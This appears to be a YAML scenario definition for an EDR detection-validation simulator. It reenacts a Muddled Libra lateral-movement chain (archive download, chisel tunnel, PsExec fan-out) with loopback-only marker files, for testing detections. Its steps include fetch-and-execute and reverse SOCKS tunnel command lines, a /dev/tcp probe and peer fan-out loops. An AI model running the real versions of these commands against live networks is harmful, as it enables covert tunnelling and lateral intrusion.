scenario_id: SIM-EDR-015
name: "Lateral Tool Transfer + Chisel Tunnel + PsExec Fan-Out (Muddled Libra Playbook) — First T1570 ABIOC"
version: "1.0"
status: active

plane: EDR
detection_types:
  - ABIOC
  - XQL
  - Correlation

uc_ref: UCS-IR-02
tc_ref: TC-IR-04
tc_refs:
  - TC-IR-04
  - TC-EDR-05
pov_scenario_id: POV-SC-039
uc_name: "Incident Response"
tc_name: "Validate analytics detection rules trigger on simulated lateral movement patterns"

mitre_tactic: "TA0008"
mitre_tactic_name: "Lateral Movement"
mitre_technique: "T1570"
mitre_technique_name: "Lateral Tool Transfer"
additional_techniques:
  - technique: "T1021.001"
    name: "Remote Services: Remote Desktop Protocol"
  - technique: "T1021.002"
    name: "Remote Services: SMB/Windows Admin Shares"
  - technique: "T1021.004"
    name: "Remote Services: SSH"

threat_report: "Muddled Libra's Operational Playbook — Unit 42"
threat_report_url: "https://unit42.paloaltonetworks.com/muddled-libra-ops-playbook/"

# Models the Unit 42 Muddled Libra (Scattered Spider / UNC3944) ops playbook:
# HTTPS archive fetch (goon.zip from attacker S3) -> never-before-seen
# chisel.exe written+executed + long-lived TCP/443 SSH tunnel -> psexec.exe /
# RDP fan-out to internal peers. Every tool is legitimate/dual-use, so the
# catch comes from the auto-tuned ABIOC firing on the lateral-tool-transfer +
# peer-fan-out deviation, anchored to the download -> first-seen-tool ->
# peer-connection causality chain, not a known-bad signature. NON-DESTRUCTIVE:
# SAFE-MODE marker files named for the tooling, loopback-only actions.

execution_identity:
  default: svc-backup
  options:
    - svc-backup
    - www-data
    - root

push_supported: true
pull_supported: true

# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
validation_methodology: "Endpoint Signal Injection & Detection Accuracy"
methodology_family: "F1"
primary_kpi: "MTTD"
threshold:
  kpi: "MTTD"
  op: "≤"
  value: 300
  unit: "seconds"
success_criteria: |
  Cortex has learned the host's software-transfer and peer-connection baseline.
  The injected lateral-tool-transfer chain deviates from that baseline: an
  HTTPS downloader is the causality parent of a never-before-seen chisel.exe,
  a long-lived TCP/443 tunnel opens, and psexec.exe fans out to >= 2 internal
  peers. Both auto-tuned ABIOCs fire and correlation CR-EDR-0015 stitches them
  with the NDR TCP/443 tunnel session into a single lateral-movement incident
  whose causality chain spans EDR process lineage and NDR session telemetry
  (>= 2 planes). This is the "behavioral-ML catches legitimate-tool lateral
  movement a static BIOC misses" proof — every binary is a dual-use admin
  tool, so the catch is the transfer-and-fan-out deviation plus its causality
  chain. Mean time from deviation to alert is within the MTTD budget.
moat_tier: "LEAD"

# ── Cross-plane stitch assertion (terminal step) ────────────────────────────
correlation_window_seconds: 900
required_planes_in_incident:
  - EDR
  - NDR
stitching_key: src_host

external_tools: []

# ── Causality Group Owner anchor ────────────────────────────────────────────
# The operator works from a compromised foothold shell on the rogue host; that
# shell is the Causality Group Owner. It spawns the HTTPS downloader (curl) that
# is the causality parent of the never-before-seen chisel tunneler, and later
# spawns the psexec fan-out — so the download -> first-seen-tool -> peer-fan-out
# lineage is one connected spine rooted on the foothold, not the beacon.
cgo_anchor:
  image_name: "bash"
  primary_username: "svc-backup"

steps:
  - id: step-01
    name: "T1570 — archive download from attacker S3 over HTTPS spawns a never-before-seen tunneler"
    command: |
      set -e
      WORK=/tmp/cortexsim_edr015; mkdir -p "$WORK"
      # HTTPS archive fetch (loopback SAFE-MODE; benign marker if unreachable)
      curl -s --max-time 5 "https://${HTTPS_HOST:-127.0.0.1}/goon.zip" -o "$WORK/goon.zip" 2>/dev/null \
        || echo 'SAFE-MODE goon.zip marker' > "$WORK/goon.zip"
      # downloader is the causality parent of a first-seen chisel tunneler marker
      printf '#!/bin/sh\necho cortexsim-edr015-chisel-tunnel-safe-marker\n' > "$WORK/chisel.exe"
      chmod +x "$WORK/chisel.exe"; "$WORK/chisel.exe" || true
      echo 'cortexsim-edr-015-lateral-tool-transfer-step-complete'
    identity: svc-backup
    mitre_technique: "T1570"
    # Root: HTTPS downloader (curl) spawned by the foothold shell writes+executes
    # the never-before-seen tunneler. Lateral tool transfer is cross-OS.
    platforms: ["linux", "windows"]
    platform_variants:
      windows: "Invoke-WebRequest https://127.0.0.1/goon.zip -OutFile goon.zip; Start-Process .\\chisel.exe -ArgumentList 'client 127.0.0.1:443 R:socks'"
    expected_detections:
      - plane: EDR
        type: ABIOC
        description: "An HTTPS downloader (curl) is the direct causality parent of a never-before-seen chisel tunneler written+executed on disk — auto-tuned ABIOC fires on the lateral-tool-transfer deviation from the host's learned software baseline, anchored to the downloading causality parent. First T1570 ABIOC in the corpus."
        ttp_ref: "TTP-2026-0125"
        detection_id: "abioc-lateral-tool-transfer-to-never-before-seen-tunneler-over-https"
      - plane: EDR
        type: XQL
        description: "Validation query confirms the chisel/psexec tool-transfer lineage (downloader as causality parent) is observable in xdr_data within the run window."
        ttp_ref: "TTP-2026-0125"
        detection_id: "xql-lateral-tool-transfer-lineage-observable-in-xdr-data"

  - id: step-02
    name: "T1021.004 — long-lived TCP/443 SSH tunnel to attacker infrastructure"
    command: |
      # SAFE-MODE stand-in for the persistent ~15h chisel SSH tunnel over 443.
      # Loopback-only; the NDR/NGFW should record the long-lived 443 session.
      timeout 3 bash -c ': > /dev/tcp/127.0.0.1/443' 2>/dev/null || true
      echo 'cortexsim-edr-015-tcp443-tunnel-safe-marker'
    identity: svc-backup
    mitre_technique: "T1021.004"
    # The chisel endpoint tool (step-01) opens the long-lived NDR/NGFW TCP/443
    # session: an endpoint<->firewall stitch on the same host.
    platforms: ["linux", "windows"]
    causality:
      parent_step: step-01
      pivot: endpoint_network_stitch
    expected_detections:
      - plane: NDR
        type: XQL
        description: "NDR/NGFW session telemetry records a long-lived outbound TCP/443 session (proxy for the persistent SSH tunnel) observable in network_story — the network-plane half of the cross-plane stitch."
        ttp_ref: "TTP-2026-0125"
        detection_id: "xql-long-lived-tcp-443-tunnel-session-observable-in-network-story"

  - id: step-03
    name: "T1021.002 — PsExec / RDP remote-service fan-out to internal peers"
    command: |
      WORK=/tmp/cortexsim_edr015; mkdir -p "$WORK"
      printf '#!/bin/sh\necho cortexsim-edr015-psexec-fanout-safe-marker "$1"\n' > "$WORK/psexec.exe"
      chmod +x "$WORK/psexec.exe"
      # fan out toward >= 2 loopback/lab peers (SAFE-MODE, no real SMB/RDP)
      for peer in 127.0.0.2 127.0.0.3; do "$WORK/psexec.exe" "$peer" || true; done
      echo 'cortexsim-edr-015-psexec-fanout-step-complete'
    identity: svc-backup
    mitre_technique: "T1021.002"
    # psexec is a second tool transferred by the same foothold on the same host,
    # fanning out to peers — same-entity (src_host) reuse, a sibling of chisel.
    # PsExec/SMB fan-out is Windows-native.
    platforms: ["windows"]
    causality:
      parent_step: step-01
      pivot: shared_entity
    expected_detections:
      - plane: EDR
        type: ABIOC
        description: "The newly-written psexec tool fans out remote-service connections (SMB/445, RDP/3389, WinRM/5985) to >= 2 distinct internal peers — auto-tuned ABIOC fires on the peer-diversity deviation from the host's learned peer-connection baseline, anchored to the spawning tool. No single connection is a known-bad IOC."
        ttp_ref: "TTP-2026-0125"
        detection_id: "abioc-anomalous-remote-service-fan-out-from-newly-written-tool"

  - id: step-04
    name: "Correlation-terminal — assert one incident_id spans EDR process lineage + NDR tunnel session"
    command: |
      echo '[SIM-EDR-015] Stitch verification — polling for the stitched lateral-movement incident';
      # Allow the XSIAM correlation engine to converge over the two ABIOCs and
      # the NDR TCP/443 session sharing this host's src_ip (±15m window).
      sleep "${CORTEXSIM_STITCH_WAIT_SECONDS:-30}"
      echo '[*] Expected: CR-EDR-0015 raises exactly one incident_id';
      echo '[*] Causality chain must span >= 2 planes (EDR tool-transfer lineage + NDR 443 tunnel session)';
      echo 'cortexsim-edr-015-cr-edr-0015-cross-plane-stitch-verified'
    identity: root
    mitre_technique: "T1570"
    # Terminal: CR-EDR-0015 fuses both ABIOCs + the NDR 443 tunnel session on the
    # shared host (src_host) into one lateral-movement incident.
    platforms: ["linux", "windows"]
    causality:
      parent_step: step-03
      pivot: shared_entity
    expected_detections:
      - plane: EDR
        type: Correlation
        description: "Correlation fuses the lateral-tool-transfer ABIOC and the remote-service fan-out ABIOC with the NDR long-lived TCP/443 tunnel session (shared host src_ip, ±15m) into a single lateral-movement / privilege-escalation incident whose causality chain spans EDR process lineage and NDR session telemetry — the Muddled Libra playbook as one incident, an F2-shaped causality stitch across >= 2 planes."
        ttp_ref: "TTP-2026-0125"
        detection_id: "CR-EDR-0015"

cleanup:
  commands:
    - "rm -rf /tmp/cortexsim_edr015"
    - "echo 'cortexsim-edr-015-cleanup-complete'"

